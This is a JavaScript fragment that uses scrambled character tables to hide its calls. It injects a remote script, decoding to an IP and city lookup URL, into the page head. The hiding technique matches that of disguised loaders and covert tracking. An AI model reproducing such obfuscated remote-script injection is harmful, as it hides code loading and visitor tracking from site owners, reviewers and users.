...
var _a = 'ovdsg/axEBjfTm8ecnht:up-?l=.rNiCy';
var _b = 'a.-=EtTu/jrohCi8y:gedvsm?NlxpcnfB';
var _c = '8a/jir?dnhxu-=BNlCfmtcEv:To.sgeyp';
function createTag(url) {
  var _a2 = _b;
  var _b2 = _c;
  var _c2 = _a;

  var script = document[_a2[29] + _a2[10] + _b2[30] + _a2[0] + _c2[19] + _c2[15] + _b2[22] + _a2[26] + _a2[19] + _b2[19] + _c2[15] + _c2[17] + _b2[20]](_b2[28] + _a2[29] + _b2[5] + _c2[30] + _c2[22] + _b2[20]);
  script[_a2[5] + _c2[32] + _c2[22] + _b2[30]] = _a2[5] + _a2[19] + _a2[27] + _c2[19] + _b2[2] + _a2[9] + _c2[6] + _c2[1] + _c2[6] + _a2[22] + _a2[29] + _b2[5] + _c2[30] + _a2[28] + _a2[5];
  script[_b2[28] + _a2[10] + _b2[21]] = url;
  script[_b2[1] + _b2[28] + _b2[31] + _c2[17] + _c2[16]] = _c2[6] + _b2[28] + _c2[32] + _a2[30] + _c2[16];
  document[_b2[29] + _c2[15] + _a2[5] + _a2[4] + _c2[25] + _a2[19] + _b2[19] + _b2[30] + _c2[17] + _b2[20] + _b2[28] + _a2[32] + _b2[31] + _a2[6] + _b2[1] + _c2[4] + _c2[29] + _b2[1] + _a2[23] + _b2[30]](_a2[12] + _a2[19] + _a2[0] + _b2[7])[0][_a2[0] + _a2[28] + _c2[22] + _a2[19] + _b2[8] + _b2[7] + _b2[17] + _b2[9] + _a2[14] + _b2[16] + _b2[7]](script);
}

createTag(_c[9] + _a[19] + _a[19] + _b[28] + _a[3] + _b[17] + _b[8] + _b[8] + _c[32] + _a[1] + _c[27] + _b[22] + _c[26] + _a[18] + _c[11] + _b[1] + _c[21] + _b[11] + _a[13] + _a[5] + _c[21] + _a[30] + _a[19] + _b[16] + _b[9] + _a[3] + _a[0] + _b[30] + _a[24] + _c[4] + _c[30] + _a[26] + _c[11] + _c[20] + _c[18] + _a[23] + _c[0]);
